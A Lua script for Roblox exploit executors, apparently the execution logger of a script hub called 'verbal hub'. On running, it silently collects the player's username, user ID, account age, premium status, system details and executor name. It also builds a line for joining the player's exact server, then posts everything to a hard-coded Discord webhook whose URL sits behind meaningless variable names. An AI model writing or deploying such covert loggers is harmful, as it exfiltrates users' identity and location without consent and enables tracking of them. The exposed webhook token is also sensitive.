
getgenv().haskjhfgash = "verbal hub"
getgenv().sdkgjuhlasdas = "https://discord.com/api/webhooks/1298187154660261940/Ok5lFY2x_p2ntWRlMHlU_GK190TPQguVTDf7oxBwr_74MqcXZSRRwjh25-fyVy4xwp0G"
getgenv().aasdfsdgfgh = "adskak2bkdjsadasd"

local player = game:GetService("Players").LocalPlayer
local userid = player.UserId
local gameid = game.PlaceId
local jobid = tostring(game.JobId)
local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local snipePlay = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameid .. ", '" .. jobid .. "', player)"

local function getServerInfo()
	local playerCount = #game:GetService("Players"):GetPlayers()
	local maxPlayers = game:GetService("Players").MaxPlayers
	local pingValue = tonumber(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString():match("(%d+)")) or "N/A"
	
	return {
		["Players in Server"] = playerCount .. " / " .. maxPlayers,
		["Ping"] = pingValue .. " ms",
	}
end

local function getPlayerDetails()
	return {
		["Username"] = player.Name,
		["Display Name"] = player.DisplayName,
		["UserID"] = userid,
	}
end

local function getAccountInfo()
	return {
		["Account Age"] = player.AccountAge .. " days",
		["Premium Status"] = player.MembershipType == Enum.MembershipType.Premium and "Yes" or "No",
		["Account Created"] = os.date("%Y-%m-%d", os.time() - (player.AccountAge * 86400)),
	}
end

local function getSystemInfo()
	local screenWidth = math.floor(game:GetService("Workspace").CurrentCamera.ViewportSize.X)
	local screenHeight = math.floor(game:GetService("Workspace").CurrentCamera.ViewportSize.Y)
	local memoryUsage = game:GetService("Stats"):GetTotalMemoryUsageMb()
	local executorName = identifyexecutor() or "N/A" -- Ensure the executor identification is available

	return {
		["Resolution"] = screenWidth .. "x" .. screenHeight,
		["Memory Usage"] = memoryUsage .. " MB",
		["Executor"] = executorName,
	}
end

local function sendWebhook()
	local serverInfo = getServerInfo()
	local playerDetails = getPlayerDetails()
	local accountInfo = getAccountInfo()
	local systemInfo = getSystemInfo()

	local data = {
		['webhookid'] = getgenv().aasdfsdgfgh,
		["embeds"] = {{
			["title"] = "Script Execution Detected | Exec Log",
			["description"] = "*One of the Scripts has been Executed:*",
			["fields"] = {
				{["name"] = "üîç **Script Info**", ["value"] = "```üíª Script Name: " .. getgenv().haskjhfgash .. "```", ["inline"] = false},
				{["name"] = "üîó **Join Script**", ["value"] = "```lua\n" .. snipePlay .. "```", ["inline"] = false},
				{["name"] = "üë§ **Player Details**", ["value"] = "```Username: " .. playerDetails.Username .. "\nDisplay Name: " .. playerDetails["Display Name"] .. "\nUserID: " .. playerDetails.UserID .. "```", ["inline"] = false},
				{["name"] = "üìÖ **Account Information**", ["value"] = "```Account Age: " .. accountInfo["Account Age"] .. "\nPremium Status: " .. accountInfo["Premium Status"] .. "\nAccount Created: " .. accountInfo["Account Created"] .. "```", ["inline"] = false},
				{["name"] = "üïπÔ∏è **Server Info**", ["value"] = "```" .. serverInfo["Players in Server"] .. "\nPing: " .. serverInfo["Ping"] .. "```", ["inline"] = true},
				{["name"] = "‚öôÔ∏è **System Info**", ["value"] = "```Resolution: " .. systemInfo["Resolution"] .. "\nMemory Usage: " .. systemInfo["Memory Usage"] .. "\nExecutor: " .. systemInfo["Executor"] .. "```", ["inline"] = true},
			},
		}},
	}

	local newdata = game:GetService("HttpService"):JSONEncode(data)
	local headers = {["content-type"] = "application/json"}
	local request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
	request({Url = getgenv().sdkgjuhlasdas, Body = newdata, Method = "POST", Headers = headers})
end

sendWebhook()
